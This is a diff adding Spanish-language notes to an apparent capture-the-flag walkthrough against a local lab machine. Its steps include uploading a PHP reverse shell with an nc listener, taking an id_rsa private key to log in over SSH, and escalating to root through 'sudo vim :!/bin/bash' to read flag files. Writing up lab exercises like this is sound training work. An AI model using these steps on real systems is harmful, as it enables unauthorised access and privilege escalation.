@@ -7,3 +7,19 @@ Comprobar y Subir la reverse shell .php
 quedar a la espera con el nc -lnv 1234
 
 http://172.0.0.1:8082/uploads/php-reverse-shell.php
+
+en /tmp se descomprime fichero y se hace un cat del id_rsa
+
+se crea el id_rsa fuera del contenedor para conectarse
+
+chmod 600 id_rsa
+
+ssh -p 2222 user@127.0.0.1 -i id_rsa
+
+cat /home/user/flag.txt
+
+sudo -l
+
+sudo vim :!/bin/bash
+
+cat /root/root.txt
